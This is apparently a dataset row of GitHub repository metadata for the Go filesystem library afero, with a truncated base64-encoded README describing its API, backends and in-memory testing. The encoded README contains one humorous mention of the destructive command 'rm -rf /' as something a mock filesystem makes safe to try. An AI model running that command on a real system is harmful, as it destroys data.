name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
b'afero',25872841,b'A FileSystem Abstraction System for Go',b'Go',83,2400,,2400,False,b'https://api.github.com/repos/spf13/afero/forks',"IVthZmVybyBsb2dvLXNtXShodHRwczovL2Nsb3VkLmdpdGh1YnVzZXJjb250
ZW50LmNvbS9hc3NldHMvMTczNDEyLzExNDkwMzM4L2Q1MGUxNmRjLTk3YTUt
MTFlNS04YjEyLTAxOWEzMDBkMGZjYi5wbmcpCgpBIEZpbGVTeXN0ZW0gQWJz
dHJhY3Rpb24gU3lzdGVtIGZvciBHbwoKWyFbQnVpbGQgU3RhdHVzXShodHRw
czovL3RyYXZpcy1jaS5vcmcvc3BmMTMvYWZlcm8uc3ZnKV0oaHR0cHM6Ly90
cmF2aXMtY2kub3JnL3NwZjEzL2FmZXJvKSBbIVtCdWlsZCBzdGF0dXNdKGh0
dHBzOi8vY2kuYXBwdmV5b3IuY29tL2FwaS9wcm9qZWN0cy9zdGF0dXMvZ2l0
aHViL3NwZjEzL2FmZXJvP2JyYW5jaD1tYXN0ZXImc3ZnPXRydWUpXShodHRw
czovL2NpLmFwcHZleW9yLmNvbS9wcm9qZWN0L3NwZjEzL2FmZXJvKSBbIVtH
b0RvY10oaHR0cHM6Ly9nb2RvYy5vcmcvZ2l0aHViLmNvbS9zcGYxMy9hZmVy
bz9zdGF0dXMuc3ZnKV0oaHR0cHM6Ly9nb2RvYy5vcmcvZ2l0aHViLmNvbS9z
cGYxMy9hZmVybykgWyFbSm9pbiB0aGUgY2hhdCBhdCBodHRwczovL2dpdHRl
ci5pbS9zcGYxMy9hZmVyb10oaHR0cHM6Ly9iYWRnZXMuZ2l0dGVyLmltL0Rl
diUyMENoYXQuc3ZnKV0oaHR0cHM6Ly9naXR0ZXIuaW0vc3BmMTMvYWZlcm8/
dXRtX3NvdXJjZT1iYWRnZSZ1dG1fbWVkaXVtPWJhZGdlJnV0bV9jYW1wYWln
bj1wci1iYWRnZSZ1dG1fY29udGVudD1iYWRnZSkKCiMgT3ZlcnZpZXcKCkFm
ZXJvIGlzIGFuIGZpbGVzeXN0ZW0gZnJhbWV3b3JrIHByb3ZpZGluZyBhIHNp
bXBsZSwgdW5pZm9ybSBhbmQgdW5pdmVyc2FsIEFQSQppbnRlcmFjdGluZyB3
aXRoIGFueSBmaWxlc3lzdGVtLCBhcyBhbiBhYnN0cmFjdGlvbiBsYXllciBw
cm92aWRpbmcgaW50ZXJmYWNlcywKdHlwZXMgYW5kIG1ldGhvZHMuIEFmZXJv
IGhhcyBhbiBleGNlcHRpb25hbGx5IGNsZWFuIGludGVyZmFjZSBhbmQgc2lt
cGxlIGRlc2lnbgp3aXRob3V0IG5lZWRsZXNzIGNvbnN0cnVjdG9ycyBvciBp
bml0aWFsaXphdGlvbiBtZXRob2RzLgoKQWZlcm8gaXMgYWxzbyBhIGxpYnJh
cnkgcHJvdmlkaW5nIGEgYmFzZSBzZXQgb2YgaW50ZXJvcGVyYWJsZSBiYWNr
ZW5kCmZpbGVzeXN0ZW1zIHRoYXQgbWFrZSBpdCBlYXN5IHRvIHdvcmsgd2l0
aCBhZmVybyB3aGlsZSByZXRhaW5pbmcgYWxsIHRoZSBwb3dlcgphbmQgYmVu
ZWZpdCBvZiB0aGUgb3MgYW5kIGlvdXRpbCBwYWNrYWdlcy4KCkFmZXJvIHBy
b3ZpZGVzIHNpZ25pZmljYW50IGltcHJvdmVtZW50cyBvdmVyIHVzaW5nIHRo
ZSBvcyBwYWNrYWdlIGFsb25lLCBtb3N0Cm5vdGFibHkgdGhlIGFiaWxpdHkg
dG8gY3JlYXRlIG1vY2sgYW5kIHRlc3RpbmcgZmlsZXN5c3RlbXMgd2l0aG91
dCByZWx5aW5nIG9uIHRoZSBkaXNrLgoKSXQgaXMgc3VpdGFibGUgZm9yIHVz
ZSBpbiBhIGFueSBzaXR1YXRpb24gd2hlcmUgeW91IHdvdWxkIGNvbnNpZGVy
IHVzaW5nIHRoZSBPUwpwYWNrYWdlIGFzIGl0IHByb3ZpZGVzIGFuIGFkZGl0
aW9uYWwgYWJzdHJhY3Rpb24gdGhhdCBtYWtlcyBpdCBlYXN5IHRvIHVzZSBh
Cm1lbW9yeSBiYWNrZWQgZmlsZSBzeXN0ZW0gZHVyaW5nIHRlc3RpbmcuIEl0
IGFsc28gYWRkcyBzdXBwb3J0IGZvciB0aGUgaHR0cApmaWxlc3lzdGVtIGZv
ciBmdWxsIGludGVyb3BlcmFiaWxpdHkuCgoKIyMgQWZlcm8gRmVhdHVyZXMK
CiogQSBzaW5nbGUgY29uc2lzdGVudCBBUEkgZm9yIGFjY2Vzc2luZyBhIHZh
cmlldHkgb2YgZmlsZXN5c3RlbXMKKiBJbnRlcm9wZXJhdGlvbiBiZXR3ZWVu
IGEgdmFyaWV0eSBvZiBmaWxlIHN5c3RlbSB0eXBlcwoqIEEgc2V0IG9mIGlu
dGVyZmFjZXMgdG8gZW5jb3VyYWdlIGFuZCBlbmZvcmNlIGludGVyb3BlcmFi
aWxpdHkgYmV0d2VlbiBiYWNrZW5kcwoqIEFuIGF0b21pYyBjcm9zcyBwbGF0
Zm9ybSBtZW1vcnkgYmFja2VkIGZpbGUgc3lzdGVtCiogU3VwcG9ydCBmb3Ig
Y29tcG9zaXRpb25hbCAodW5pb24pIGZpbGUgc3lzdGVtcyBieSBjb21iaW5p
bmcgbXVsdGlwbGUgZmlsZSBzeXN0ZW1zIGFjdGluZyBhcyBvbmUKKiBTcGVj
aWFsaXplZCBiYWNrZW5kcyB3aGljaCBtb2RpZnkgZXhpc3RpbmcgZmlsZXN5
c3RlbXMgKFJlYWQgT25seSwgUmVnZXhwIGZpbHRlcmVkKQoqIEEgc2V0IG9m
IHV0aWxpdHkgZnVuY3Rpb25zIHBvcnRlZCBmcm9tIGlvLCBpb3V0aWwgJiBo
dWdvIHRvIGJlIGFmZXJvIGF3YXJlCgoKIyBVc2luZyBBZmVybwoKQWZlcm8g
aXMgZWFzeSB0byB1c2UgYW5kIGVhc2llciB0byBhZG9wdC4KCkEgZmV3IGRp
ZmZlcmVudCB3YXlzIHlvdSBjb3VsZCB1c2UgQWZlcm86CgoqIFVzZSB0aGUg
aW50ZXJmYWNlcyBhbG9uZSB0byBkZWZpbmUgeW91IG93biBmaWxlIHN5c3Rl
bS4KKiBXcmFwIGZvciB0aGUgT1MgcGFja2FnZXMuCiogRGVmaW5lIGRpZmZl
cmVudCBmaWxlc3lzdGVtcyBmb3IgZGlmZmVyZW50IHBhcnRzIG9mIHlvdXIg
YXBwbGljYXRpb24uCiogVXNlIEFmZXJvIGZvciBtb2NrIGZpbGVzeXN0ZW1z
IHdoaWxlIHRlc3RpbmcKCiMjIFN0ZXAgMTogSW5zdGFsbCBBZmVybwoKRmly
c3QgdXNlIGdvIGdldCB0byBpbnN0YWxsIHRoZSBsYXRlc3QgdmVyc2lvbiBv
ZiB0aGUgbGlicmFyeS4KCiAgICAkIGdvIGdldCBnaXRodWIuY29tL3NwZjEz
L2FmZXJvCgpOZXh0IGluY2x1ZGUgQWZlcm8gaW4geW91ciBhcHBsaWNhdGlv
bi4KYGBgZ28KaW1wb3J0ICJnaXRodWIuY29tL3NwZjEzL2FmZXJvIgpgYGAK
CiMjIFN0ZXAgMjogRGVjbGFyZSBhIGJhY2tlbmQKCkZpcnN0IGRlZmluZSBh
IHBhY2thZ2UgdmFyaWFibGUgYW5kIHNldCBpdCB0byBhIHBvaW50ZXIgdG8g
YSBmaWxlc3lzdGVtLgpgYGBnbwp2YXIgQXBwRnMgPSBhZmVyby5OZXdNZW1N
YXBGcygpCgpvcgoKdmFyIEFwcEZzID0gYWZlcm8uTmV3T3NGcygpCmBgYApJ
dCBpcyBpbXBvcnRhbnQgdG8gbm90ZSB0aGF0IGlmIHlvdSByZXBlYXQgdGhl
IGNvbXBvc2l0ZSBsaXRlcmFsIHlvdQp3aWxsIGJlIHVzaW5nIGEgY29tcGxl
dGVseSBuZXcgYW5kIGlzb2xhdGVkIGZpbGVzeXN0ZW0uIEluIHRoZSBjYXNl
IG9mCk9zRnMgaXQgd2lsbCBzdGlsbCB1c2UgdGhlIHNhbWUgdW5kZXJseWlu
ZyBmaWxlc3lzdGVtIGJ1dCB3aWxsIHJlZHVjZQp0aGUgYWJpbGl0eSB0byBk
cm9wIGluIG90aGVyIGZpbGVzeXN0ZW1zIGFzIGRlc2lyZWQuCgojIyBTdGVw
IDM6IFVzZSBpdCBsaWtlIHlvdSB3b3VsZCB0aGUgT1MgcGFja2FnZQoKVGhy
b3VnaG91dCB5b3VyIGFwcGxpY2F0aW9uIHVzZSBhbnkgZnVuY3Rpb24gYW5k
IG1ldGhvZCBsaWtlIHlvdSBub3JtYWxseQp3b3VsZC4KClNvIGlmIG15IGFw
cGxpY2F0aW9uIGJlZm9yZSBoYWQ6CmBgYGdvCm9zLk9wZW4oJy90bXAvZm9v
JykKYGBgCldlIHdvdWxkIHJlcGxhY2UgaXQgd2l0aDoKYGBgZ28KQXBwRnMu
T3BlbignL3RtcC9mb28nKQpgYGAKCmBBcHBGc2AgYmVpbmcgdGhlIHZhcmlh
YmxlIHdlIGRlZmluZWQgYWJvdmUuCgoKIyMgTGlzdCBvZiBhbGwgYXZhaWxh
YmxlIGZ1bmN0aW9ucwoKRmlsZSBTeXN0ZW0gTWV0aG9kcyBBdmFpbGFibGU6
CmBgYGdvCkNobW9kKG5hbWUgc3RyaW5nLCBtb2RlIG9zLkZpbGVNb2RlKSA6
IGVycm9yCkNodGltZXMobmFtZSBzdHJpbmcsIGF0aW1lIHRpbWUuVGltZSwg
bXRpbWUgdGltZS5UaW1lKSA6IGVycm9yCkNyZWF0ZShuYW1lIHN0cmluZykg
OiBGaWxlLCBlcnJvcgpNa2RpcihuYW1lIHN0cmluZywgcGVybSBvcy5GaWxl
TW9kZSkgOiBlcnJvcgpNa2RpckFsbChwYXRoIHN0cmluZywgcGVybSBvcy5G
aWxlTW9kZSkgOiBlcnJvcgpOYW1lKCkgOiBzdHJpbmcKT3BlbihuYW1lIHN0
cmluZykgOiBGaWxlLCBlcnJvcgpPcGVuRmlsZShuYW1lIHN0cmluZywgZmxh
ZyBpbnQsIHBlcm0gb3MuRmlsZU1vZGUpIDogRmlsZSwgZXJyb3IKUmVtb3Zl
KG5hbWUgc3RyaW5nKSA6IGVycm9yClJlbW92ZUFsbChwYXRoIHN0cmluZykg
OiBlcnJvcgpSZW5hbWUob2xkbmFtZSwgbmV3bmFtZSBzdHJpbmcpIDogZXJy
b3IKU3RhdChuYW1lIHN0cmluZykgOiBvcy5GaWxlSW5mbywgZXJyb3IKYGBg
CkZpbGUgSW50ZXJmYWNlcyBhbmQgTWV0aG9kcyBBdmFpbGFibGU6CmBgYGdv
CmlvLkNsb3Nlcgppby5SZWFkZXIKaW8uUmVhZGVyQXQKaW8uU2Vla2VyCmlv
LldyaXRlcgppby5Xcml0ZXJBdAoKTmFtZSgpIDogc3RyaW5nClJlYWRkaXIo
Y291bnQgaW50KSA6IFtdb3MuRmlsZUluZm8sIGVycm9yClJlYWRkaXJuYW1l
cyhuIGludCkgOiBbXXN0cmluZywgZXJyb3IKU3RhdCgpIDogb3MuRmlsZUlu
Zm8sIGVycm9yClN5bmMoKSA6IGVycm9yClRydW5jYXRlKHNpemUgaW50NjQp
IDogZXJyb3IKV3JpdGVTdHJpbmcocyBzdHJpbmcpIDogcmV0IGludCwgZXJy
IGVycm9yCmBgYApJbiBzb21lIGFwcGxpY2F0aW9ucyBpdCBtYXkgbWFrZSBz
ZW5zZSB0byBkZWZpbmUgYSBuZXcgcGFja2FnZSB0aGF0CnNpbXBseSBleHBv
cnRzIHRoZSBmaWxlIHN5c3RlbSB2YXJpYWJsZSBmb3IgZWFzeSBhY2Nlc3Mg
ZnJvbSBhbnl3aGVyZS4KCiMjIFVzaW5nIEFmZXJvJ3MgdXRpbGl0eSBmdW5j
dGlvbnMKCkFmZXJvIHByb3ZpZGVzIGEgc2V0IG9mIGZ1bmN0aW9ucyB0byBt
YWtlIGl0IGVhc2llciB0byB1c2UgdGhlIHVuZGVybHlpbmcgZmlsZSBzeXN0
ZW1zLgpUaGVzZSBmdW5jdGlvbnMgaGF2ZSBiZWVuIHByaW1hcmlseSBwb3J0
ZWQgZnJvbSBpbyAmIGlvdXRpbCB3aXRoIHNvbWUgZGV2ZWxvcGVkIGZvciBI
dWdvLgoKVGhlIGFmZXJvIHV0aWxpdGllcyBzdXBwb3J0IGFsbCBhZmVybyBj
b21wYXRpYmxlIGJhY2tlbmRzLgoKVGhlIGxpc3Qgb2YgdXRpbGl0aWVzIGlu
Y2x1ZGVzOgoKYGBgZ28KRGlyRXhpc3RzKHBhdGggc3RyaW5nKSAoYm9vbCwg
ZXJyb3IpCkV4aXN0cyhwYXRoIHN0cmluZykgKGJvb2wsIGVycm9yKQpGaWxl
Q29udGFpbnNCeXRlcyhmaWxlbmFtZSBzdHJpbmcsIHN1YnNsaWNlIFtdYnl0
ZSkgKGJvb2wsIGVycm9yKQpHZXRUZW1wRGlyKHN1YlBhdGggc3RyaW5nKSBz
dHJpbmcKSXNEaXIocGF0aCBzdHJpbmcpIChib29sLCBlcnJvcikKSXNFbXB0
eShwYXRoIHN0cmluZykgKGJvb2wsIGVycm9yKQpSZWFkRGlyKGRpcm5hbWUg
c3RyaW5nKSAoW11vcy5GaWxlSW5mbywgZXJyb3IpClJlYWRGaWxlKGZpbGVu
YW1lIHN0cmluZykgKFtdYnl0ZSwgZXJyb3IpClNhZmVXcml0ZVJlYWRlcihw
YXRoIHN0cmluZywgciBpby5SZWFkZXIpIChlcnIgZXJyb3IpClRlbXBEaXIo
ZGlyLCBwcmVmaXggc3RyaW5nKSAobmFtZSBzdHJpbmcsIGVyciBlcnJvcikK
VGVtcEZpbGUoZGlyLCBwcmVmaXggc3RyaW5nKSAoZiBGaWxlLCBlcnIgZXJy
b3IpCldhbGsocm9vdCBzdHJpbmcsIHdhbGtGbiBmaWxlcGF0aC5XYWxrRnVu
YykgZXJyb3IKV3JpdGVGaWxlKGZpbGVuYW1lIHN0cmluZywgZGF0YSBbXWJ5
dGUsIHBlcm0gb3MuRmlsZU1vZGUpIGVycm9yCldyaXRlUmVhZGVyKHBhdGgg
c3RyaW5nLCByIGlvLlJlYWRlcikgKGVyciBlcnJvcikKYGBgCkZvciBhIGNv
bXBsZXRlIGxpc3Qgc2VlIFtBZmVybydzIEdvRG9jXShodHRwczovL2dvZG9j
Lm9yZy9naXRodWIuY29tL3NwZjEzL2FmZXJvKQoKVGhleSBhcmUgYXZhaWxh
YmxlIHVuZGVyIHR3byBkaWZmZXJlbnQgYXBwcm9hY2hlcyB0byB1c2UuIFlv
dSBjYW4gZWl0aGVyIGNhbGwKdGhlbSBkaXJlY3RseSB3aGVyZSB0aGUgZmly
c3QgcGFyYW1ldGVyIG9mIGVhY2ggZnVuY3Rpb24gd2lsbCBiZSB0aGUgZmls
ZQpzeXN0ZW0sIG9yIHlvdSBjYW4gZGVjbGFyZSBhIG5ldyBgQWZlcm9gLCBh
IGN1c3RvbSB0eXBlIHVzZWQgdG8gYmluZCB0aGVzZQpmdW5jdGlvbnMgYXMg
bWV0aG9kcyB0byBhIGdpdmVuIGZpbGVzeXN0ZW0uCgojIyMgQ2FsbGluZyB1
dGlsaXRpZXMgZGlyZWN0bHkKCmBgYGdvCmZzIDo9IG5ldyhhZmVyby5NZW1N
YXBGcykKZiwgZXJyIDo9IGFmZXJvLlRlbXBGaWxlKGZzLCIiLCAiaW91dGls
LXRlc3QiKQoKYGBgCgojIyMgQ2FsbGluZyB2aWEgQWZlcm8KCmBgYGdvCmZz
IDo9IGFmZXJvLk5ld01lbU1hcEZzKCkKYWZzIDo9ICZhZmVyby5BZmVyb3tG
czogZnN9CmYsIGVyciA6PSBhZnMuVGVtcEZpbGUoIiIsICJpb3V0aWwtdGVz
dCIpCmBgYAoKIyMgVXNpbmcgQWZlcm8gZm9yIFRlc3RpbmcKClRoZXJlIGlz
IGEgbGFyZ2UgYmVuZWZpdCB0byB1c2luZyBhIG1vY2sgZmlsZXN5c3RlbSBm
b3IgdGVzdGluZy4gSXQgaGFzIGEKY29tcGxldGVseSBibGFuayBzdGF0ZSBl
dmVyeSB0aW1lIGl0IGlzIGluaXRpYWxpemVkIGFuZCBjYW4gYmUgZWFzaWx5
CnJlcHJvZHVjaWJsZSByZWdhcmRsZXNzIG9mIE9TLiBZb3UgY291bGQgY3Jl
YXRlIGZpbGVzIHRvIHlvdXIgaGVhcnTigJlzIGNvbnRlbnQKYW5kIHRoZSBm
aWxlIGFjY2VzcyB3b3VsZCBiZSBmYXN0IHdoaWxlIGFsc28gc2F2aW5nIHlv
dSBmcm9tIGFsbCB0aGUgYW5ub3lpbmcKaXNzdWVzIHdpdGggZGVsZXRpbmcg
dGVtcG9yYXJ5IGZpbGVzLCBXaW5kb3dzIGZpbGUgbG9ja2luZywgZXRjLiBU
aGUgTWVtTWFwRnMKYmFja2VuZCBpcyBwZXJmZWN0IGZvciB0ZXN0aW5nLgoK
KiBNdWNoIGZhc3RlciB0aGFuIHBlcmZvcm1pbmcgSS9PIG9wZXJhdGlvbnMg
b24gZGlzawoqIEF2b2lkIHNlY3VyaXR5IGlzc3VlcyBhbmQgcGVybWlzc2lv
bnMKKiBGYXIgbW9yZSBjb250cm9sLiAncm0gLXJmIC8nIHdpdGggY29uZmlk
ZW5jZQoqIFRlc3Qgc2V0dXAgaXMgZmFyIG1vcmUgZWFzaWVyIHRvIGRvCiog
Tm8gdGVzdCBjbGVhbnVwIG5lZWRlZAoKT25lIHdheSB0byBhY2NvbXBsaXNo
IHRoaXMgaXMgdG8gZGVmaW5lIGEgdmFyaWFibGUgYXMgbWVudGlvbmVkIGFi
b3ZlLgpJbiB5b3VyIGFwcGxpY2F0aW9uIHRoaXMgd2lsbCBiZSBzZXQgdG8g
YWZlcm8uTmV3T3NGcygpIGR1cmluZyB0ZXN0aW5nIHlvdQpjYW4gc2V0IGl0
IHRvIGFmZXJvLk5ld01lbU1hcEZzKCkuCgpJdCB3b3VsZG4ndCBiZSB1bmNv
bW1vbiB0byBoYXZlIGVhY2ggdGVzdCBpbml0aWFsaXplIGEgYmxhbmsgc2xh
dGUgbWVtb3J5CmJhY2tlbmQuIFRvIGRvIHRoaXMgSSB3b3VsZCBkZWZpbmUg
bXkgYGFwcEZTID0gYWZlcm8uTmV3T3NGcygpYCBzb21ld2hlcmUKYXBwcm9w
cmlhdGUgaW4gbXkgYXBwbGljYXRpb24gY29kZS4gVGhpcyBhcHByb2FjaCBl
bnN1cmVzIHRoYXQgVGVzdHMgYXJlIG9yZGVyCmluZGVwZW5kZW50LCB3aXRo
IG5vIHRlc3QgcmVseWluZyBvbiB0aGUgc3RhdGUgbGVmdCBieSBhbiBlYXJs
aWVyIHRlc3QuCgpUaGVuIGluIG15IHRlc3RzIEkgd291bGQgaW5pdGlhbGl6
ZSBhIG5ldyBNZW1NYXBGcyBmb3IgZWFjaCB0ZXN0OgpgYGBnbwpmdW5jIFRl
c3RFeGlzdCh0ICp0ZXN0aW5nLlQpIHsKCWFwcEZTIDo9IGFmZXJvLk5ld01l
bU1hcEZzKCkKCS8vIGNyZWF0ZSB0ZXN0IGZpbGVzIGFuZCBkaXJlY3Rvcmll
cwoJYXBwRlMuTWtkaXJBbGwoInNyYy9hIiwgMDc1NSkKCWFmZXJvLldyaXRl
RmlsZShhcHBGUywgInNyYy9hL2IiLCBbXWJ5dGUoImZpbGUgYiIpLCAwNjQ0
KQoJYWZlcm8uV3JpdGVGaWxlKGFwcEZTLCAic3JjL2MiLCBbXWJ5dGUoImZp
bGUgYyIpLCAwNjQ0KQoJbmFtZSA6PSAic3JjL2MiCglfLCBlcnIgOj0gYXBw
RlMuU3RhdChuYW1lKQoJaWYgb3MuSXNOb3RFeGlzdChlcnIpIHsKCQl0LkVy
cm9yZigiZmlsZSBcIiVzXCIgZG9lcyBub3QgZXhpc3QuXG4iLCBuYW1lKQoJ
fQp9CmBgYAoKIyBBdmFpbGFibGUgQmFja2VuZHMKCiMjIE9wZXJhdGluZyBT
eXN0ZW0gTmF0aXZlCgojIyMgT3NGcwoKVGhlIGZpcnN0IGlzIHNpbXBseSBh
IHdyYXBwZXIgYXJvdW5kIHRoZSBuYXRpdmUgT1MgY2FsbHMuIFRoaXMgbWFr
ZXMgaXQKdmVyeSBlYXN5IHRvIHVzZSBhcyBhbGwgb2YgdGhlIGNhbGxzIGFy
ZSB0aGUgc2FtZSBhcyB0aGUgZXhpc3RpbmcgT1MKY2FsbHMuIEl0IGFsc28g
bWFrZXMgaXQgdHJpdmlhbCB0byBoYXZlIHlvdXIgY29kZSB1c2UgdGhlIE9T
IGR1cmluZwpvcGVyYXRpb24gYW5kIGEgbW9jayBmaWxlc3lzdGVtIGR1cmlu
ZyB0ZXN0aW5nIG9yIGFzIG5lZWRlZC4KCmBgYGdvCmFwcGZzIDo9IGFmZXJv
Lk5ld09zRnMoKQphcHBmcy5Na2RpckFsbCgic3JjL2EiLCAwNzU1KSkKYGBg
CgojIyBNZW1vcnkgQmFja2VkIFN0b3JhZ2UKCiMjIyBNZW1NYXBGcwoKQWZl
cm8gYWxzbyBwcm92aWRlcyBhIGZ1bGx5IGF0b21pYyBtZW1vcnkgYmFja2Vk
IGZpbGVzeXN0ZW0gcGVyZmVjdCBmb3IgdXNlIGluCm1vY2tpbmcgYW5kIHRv
IHNwZWVkIHVwIHVubmVjZXNzYXJ5IGRpc2sgaW8gd2hlbiBwZXJzaXN0ZW5j
ZSBpc27igJl0Cm5lY2Vzc2FyeS4gSXQgaXMgZnVsbHkgY29uY3VycmVudCBh
bmQgd2lsbCB3b3JrIHdpdGhpbiBnbyByb3V0aW5lcwpzYWZlbHkuCgpgYGBn
bwptbSA6PSBhZmVyby5OZXdNZW1NYXBGcygpCm1tLk1rZGlyQWxsKCJzcmMv
YSIsIDA3NTUpKQpgYGAKCiMjIyMgSW5NZW1vcnlGaWxlCgpBcyBwYXJ0IG9m
IE1lbU1hcEZzLCBBZmVybyBhbHNvIHByb3ZpZGVzIGFuIGF0b21pYywgZnVs
bHkgY29uY3VycmVudCBtZW1vcnkKYmFja2VkIGZpbGUgaW1wbGVtZW50YXRp
b24uIFRoaXMgY2FuIGJlIHVzZWQgaW4gb3RoZXIgbWVtb3J5IGJhY2tlZCBm
aWxlCnN5c3RlbXMgd2l0aCBlYXNlLiBQbGFucyBhcmUgdG8gYWRkIGEgcmFk
aXggdHJlZSBtZW1vcnkgc3RvcmVkIGZpbGUKc3lzdGVtIHVzaW5nIEluTWVt
b3J5RmlsZS4KCiMjIE5ldHdvcmsgSW50ZXJmYWNlcwoKIyMjIFNmdHBGcwoK
QWZlcm8gaGFzIGV4cGVyaW1lbnRhbCBzdXBwb3J0IGZvciBzZWN1cmUgZmls
ZSB0cmFuc2ZlciBwcm90b2NvbCAoc2Z0cCkuIFdoaWNoIGNhbgpiZSB1c2Vk
IHRvIHBlcmZvcm0gZmlsZSBvcGVyYXRpb25zIG92ZXIgYSBlbmNyeXB0ZWQg
Y2hhbm5lbC4KCiMjIEZpbHRlcmluZyBCYWNrZW5kcwoKIyMjIEJhc2VQYXRo
RnMKClRoZSBCYXNlUGF0aEZzIHJlc3RyaWN0cyBhbGwgb3BlcmF0aW9ucyB0
byBhIGdpdmVuIHBhdGggd2l0aGluIGFuIEZzLgpUaGUgZ2l2ZW4gZmlsZSBu
YW1lIHRvIHRoZSBvcGVyYXRpb25zIG9uIHRoaXMgRnMgd2lsbCBiZSBwcmVw
ZW5kZWQgd2l0aAp0aGUgYmFzZSBwYXRoIGJlZm9yZSBjYWxsaW5nIHRoZSBz
b3VyY2UgRnMuCgpgYGBnbwpicCA6PSBhZmVyby5OZXdCYXNlUGF0aEZzKGFm
ZXJvLk5ld09zRnMoKSwgIi9iYXNlL3BhdGgiKQpgYGAKCiMjIyBSZWFkT25s
eUZzCgpBIHRoaW4gd3JhcHBlciBhcm91bmQgdGhlIHNvdXJjZSBGcyBwcm92
aWRpbmcgYSByZWFkIG9ubHkgdmlldy4KCmBgYGdvCmZzIDo9IGFmZXJvLk5l
d1JlYWRPbmx5RnMoYWZlcm8uTmV3T3NGcygpKQpfLCBlcnIgOj0gZnMuQ3Jl
YXRlKCIvZmlsZS50eHQiKQovLyBlcnIgPSBzeXNjYWxsLkVQRVJNCmBgYAoK
IyBSZWdleHBGcwoKQSBmaWx0ZXJlZCB2aWV3IG9uIGZpbGUgbmFtZXMsIGFu
eSBmaWxlIE5PVCBtYXRjaGluZwp0aGUgcGFzc2VkIHJlZ2V4cCB3aWxsIGJl
IHRyZWF0ZWQgYXMgbm9uLWV4aXN0aW5nLgpGaWxlcyBub3QgbWF0Y2hpbmcg
dGhlIHJlZ2V4cCBwcm92aWRlZCB3aWxsIG5vdCBiZSBjcmVhdGVkLgpEaXJl
Y3RvcmllcyBhcmUgbm90IGZpbHRlcmVkLgoKYGBgZ28KZnMgOj0gYWZlcm8u
TmV3UmVnZXhwRnMoYWZlcm8uTmV3TWVtTWFwRnMoKSwgcmVnZXhwLk11c3RD
b21waWxlKGBcLnR4dCRgKSkKXywgZXJyIDo9IGZzLkNyZWF0ZSgiL2ZpbGUu
aHRtbCIpCi8vIGVyciA9IHN5c2NhbGwuRU5PRU5UCmBgYAoKIyMjIEh0dHBG
cwoKQWZlcm8gcHJvdmlkZXMgYW4gaHR0cCBjb21wYXRpYmxlIGJhY2tlbmQg
d2hpY2ggY2FuIHdyYXAgYW55IG9mIHRoZSBleGlzdGluZwpiYWNrZW5kcy4K
ClRoZSBIdHRwIHBhY2thZ2UgcmVxdWlyZXMgYSBzbGlnaHRseSBzcGVjaWZp
YyB2ZXJzaW9uIG9mIE9wZW4gd2hpY2gKcmV0dXJucyBhbiBodHRwLkZpbGUg
dHlwZS4KCkFmZXJvIHByb3ZpZGVzIGFuIGh0dHBGcyBmaWxlIHN5c3RlbSB3
aGljaCBzYXRpc2ZpZXMgdGhpcyByZXF1aXJlbWVudC4KQW55IEFmZXJvIEZp
bGVTeXN0ZW0gY2FuIGJlIHVzZWQgYXMgYW4gaHR0cEZzLgoKYGBgZ28KaHR0
cEZzIDo9IGFmZXJvLk5ld0h0dHBGcyg8RXhpc3RpbmdGUz4pCmZpbGVzZXJ2
ZXIgOj0gaHR0cC5GaWxlU2VydmVyKGh0dHBGcy5EaXIoPFBBVEg+KSkpCmh0
dHAuSGFuZGxlKCIvIiwgZmlsZXNlcnZlcikKYGBgCgojIyBDb21wb3NpdGUg
QmFja2VuZHMKCkFmZXJvIHByb3ZpZGVzIHRoZSBhYmlsaXR5IGhhdmUgdHdv
IGZpbGVzeXN0ZW1zIChvciBtb3JlKSBhY3QgYXMgYSBzaW5nbGUKZmlsZSBz
eXN0ZW0uCgojIyMgQ2FjaGVPblJlYWRGcwoKVGhlIENhY2hlT25SZWFkRnMg
d2lsbCBsYXppbHkgbWFrZSBjb3BpZXMgb2YgYW55IGFjY2Vzc2VkIGZpbGVz
IGZyb20gdGhlIGJhc2UKbGF5ZXIgaW50byB0aGUgb3ZlcmxheS4gU3Vic2Vx
dWVudCByZWFkcyB3aWxsIGJlIHB1bGxlZCBmcm9tIHRoZSBvdmVybGF5CmRp
